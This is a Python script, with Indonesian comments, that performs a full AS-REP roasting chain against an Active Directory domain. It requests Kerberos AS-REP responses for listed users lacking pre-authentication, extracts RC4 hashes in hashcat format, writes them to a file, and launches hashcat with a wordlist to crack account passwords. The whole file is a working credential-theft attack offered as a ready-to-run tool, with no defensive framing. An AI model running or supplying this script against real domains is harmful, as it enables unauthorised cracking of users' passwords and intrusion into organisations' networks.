import argparse
from impacket.krb5.types import Principal
from impacket.krb5.asn1 import AS_REQ, KDC_REQ_BODY, PrincipalName
from impacket.krb5.kerberosv5 import sendReceive
from pyasn1.codec.der import encoder
import binascii
import subprocess


def build_as_req(user, domain):
    user_principal = Principal(user, type=1)
    as_req = AS_REQ()
    as_req['pvno'] = 5
    as_req['msg-type'] = 10

    req_body = KDC_REQ_BODY()

    # Gantikan KDC_OPT dengan bitmask langsung
    # forwardable (0x40000000) | proxiable (0x10000000) | renewable (0x00800000)
    req_body['kdc-options'] = int('0x50800000', 16)

    req_body['sname'] = PrincipalName()
    req_body['sname']['name-type'] = 2
    req_body['sname']['name-string'] = ['krbtgt', domain.upper()]
    req_body['realm'] = domain.upper()
    req_body['cname'] = user_principal.components_to_asn1

    as_req['req-body'] = req_body
    return encoder.encode(as_req)


def extract_hash(user, domain, response):
    hex_data = binascii.hexlify(response).decode()
    etype_index = hex_data.find("001700")  # 0x0017 = RC4-HMAC (etype 23)
    if etype_index == -1:
        return None

    enc_data_start = hex_data.find("a282", etype_index)
    if enc_data_start == -1:
        return None

    cipher_offset = hex_data.find("0482", enc_data_start)
    if cipher_offset == -1:
        return None

    cipher_len = int(hex_data[cipher_offset + 4:cipher_offset + 8], 16)
    cipher_hex = hex_data[cipher_offset + 8: cipher_offset + 8 + cipher_len * 2]

    checksum = cipher_hex[:32]
    encrypted_data = cipher_hex[32:]

    return f"$krb5asrep$23${user}@{domain}:{checksum}${encrypted_data}"


def request_asrep(user, domain, kdc):
    try:
        req = build_as_req(user, domain)
        response = sendReceive(req, domain, kdcHost=kdc)
        print(f"[+] Got AS-REP for: {user}")
        return extract_hash(user, domain, response)
    except Exception as e:
        if "KDC_ERR_PREAUTH_REQUIRED" in str(e):
            print(f"[-] Pre-auth enabled for {user}")
        elif "KDC_ERR_C_PRINCIPAL_UNKNOWN" in str(e):
            print(f"[!] User not found: {user}")
        else:
            print(f"[?] Error for {user}: {e}")
        return None


def main(domain, kdc, userfile, wordlist):
    with open(userfile, "r") as f:
        users = f.read().splitlines()

    outfile = "asrep_hashes.txt"
    open(outfile, "w").close()  # Clear previous

    for user in users:
        hashcat_hash = request_asrep(user, domain, kdc)
        if hashcat_hash:
            with open(outfile, "a") as out:
                out.write(hashcat_hash + "\n")

    if not any(open(outfile)):
        print("\n[✘] Tidak ada hash yang bisa di-roast. Semua user mungkin aktif pre-auth.")
        return

    print("\n[🔥] Memulai crack dengan hashcat...\n")
    subprocess.run(["hashcat", "-m", "18200", outfile, wordlist, "--force"])

    print("\n[✅] Menampilkan hasil password yang ditemukan:\n")
    subprocess.run(["hashcat", "-m", "18200", outfile, "--show"])


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="AS-REP Roasting Full Chain Script (Online to Hashcat)")
    parser.add_argument("domain", help="Target domain (e.g., domain.local)")
    parser.add_argument("kdc", help="KDC IP address (Domain Controller)")
    parser.add_argument("userlist", help="File berisi daftar username")
    parser.add_argument("wordlist", help="Wordlist untuk hashcat (e.g., rockyou.txt)")
    args = parser.parse_args()

    main(args.domain, args.kdc, args.userlist, args.wordlist)

